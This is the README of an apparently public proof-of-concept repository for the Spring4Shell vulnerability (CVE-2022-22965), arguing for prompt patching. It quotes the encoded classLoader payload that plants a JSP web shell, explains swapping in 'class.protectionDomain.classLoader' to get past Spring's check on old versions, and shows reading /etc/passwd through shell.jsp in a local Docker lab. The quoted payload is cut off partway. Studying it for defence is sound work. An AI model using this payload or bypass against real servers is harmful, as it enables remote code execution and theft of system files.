# Goal

The purpose of this repository is to highlight another attack vector of [CVE-2022-22965 - Spring4Shell RCE vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2022-22965#vulnCurrentDescriptionTitle) and stress out the importance of patching as soon as possible.

[Spring official announcement](https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement) identifies four requirements

* Running on JDK 9 or higher
* Apache Tomcat as the Servlet container.
* Packaged as a traditional WAR and deployed in a standalone Tomcat instance. Typical Spring Boot deployments using an embedded Servlet container or reactive web server are not impacted.
* spring-webmvc or spring-webflux dependency.
* Spring Framework versions 5.3.0 to 5.3.17, 5.2.0 to 5.2.19, and older versions.

It is also stated *The vulnerability involves ClassLoader access, and therefore in addition to the specific attack reported with a Tomcat specific ClassLoader, _other attacks may be possible_ against a different custom ClassLoader*.
This should not be taken lightly.

This code example show how this vulnerability can be exploited using JDK less than 8.

# How to ?

1. docker build . -t spring4shell-demo:jdk8-spring3
2. docker run -d -P --name poc-spring4shell-jdk8 spring4shell-demo:jdk8-spring3
3. python3 exploit-jdk8.py --url http://localhost:$(docker port poc-spring4shell-jdk8 8080 | head -1 | cut -d ':' -f2)/customer/rest/customers
4. Show /etc/passwd : curl --output passwd.txt http://localhost:$(docker port poc-spring4shell-jdk8 8080 | head -1 | cut -d ':' -f2)/shell.jsp?cmd=cat%20%2fetc%2fpasswd && cat passwd.txt

# How it works ?

## Why JDK 9 or higher as prerequisite ?

The JDK9 or higher prerequisite is set because the payload on the initial exploit uses the following path `class.module.classLoader` to access the classloader.
The module concept, which is an abstraction encapsulation above the package, has been introduced in Java 9 which is why the path above can't work with previous JDK.

You can find the payload [here](https://www.rapid7.com/blog/post/2022/03/30/spring4shell-zero-day-vulnerability-in-spring-framework/)

```shell
curl -v -d "class.module.classLoader.resources.context.parent.pipeline
.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%
22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRunt
ime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%

assLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&cl
ass.module.classLoader.resources.context.parent.pipeline.first.fileDat
eFormat=" http://<uri>
```

## Let's try JDK 8

A na√Øve idea would be to replace `class.module.classLoader` by `class.classLoader` on the exploit payload to directly access the classloader through the object class.
However, it does not work because Spring framework alread had counter measures for this. Looking at the [patch commit](https://github.com/spring-projects/spring-framework/commit/002546b3e4b8d791ea6acccb81eb3168f51abb15#diff-de34d8ca8ee09e89bce68a491958bcc09197c49243aa2db6d981ecaa035b2447L289) for CVE-2022-22965, it is understandable :

![Classloader binding protection before and after Spring4Shell](resources/classloader-access-protection-before-after-spring4shell.png)

The paths `class.classLoader` and `class.protectionDomain` are forbidden. The later one is required because otherwise you could access the classloader using `class.protectionDomain.classLoader`.

The whole cause of the current vulnerability is that Spring beans binding checks were not updated after the introduction of the module feature on Java 9.

## Circumventing Spring protection

Now that we understand why the exploit can't be run on JDK lower than 9 and the checks performed by Spring. Can we bypass them ?

Let's try to apply the same principle : maybe those checks had been introduced in a not so distant version of Spring ?

Looking at the history of the class `CachedIntrospectionResults.java` with Git, we can see that the check regarding the `protectionDomain` has been added on version [3.2.6.RELEASE](https://github.com/spring-projects/spring-framework/commit/7f895222e17b0970d4f9ab038b2f03c26aaf6f03#diff-de34d8ca8ee09e89bce68a491958bcc09197c49243aa2db6d981ecaa035b2447L263)

![Classloader binding protection after 3.2.6.RELEASE](resources/classloader-access-protection-after-3.2.6.png)

Any Spring framework version older than `3.2.6.RELEASE` is thus vulnerable provided that you perform minor changes on the exploit payload :

Replace `class.module.classLoader` by `class.protectionDomain.classLoader`.

I've also found out (without analyzing it further) that it requires a Tomcat version lower than `8.5.57` to work.

Needless to say that if you had managed your technical debt and thoroughly upgraded your stack (`3.2.6` was released on december 2013 and is no longer supported), it would not be a problem.

## Synthesis

For this attack vector to work, you need :

* Running on JDK 4 or higher
* Apache Tomcat as the Servlet container.
* Apache Tomcat versions *lower than 8.5.57*
* Packaged as a traditional WAR and deployed in a standalone Tomcat instance. Typical Spring Boot deployments using an embedded Servlet container or reactive web server are not impacted.
* spring-webmvc or spring-webflux dependency.
* Spring Framework versions *lower than 3.2.6.RELEASE*
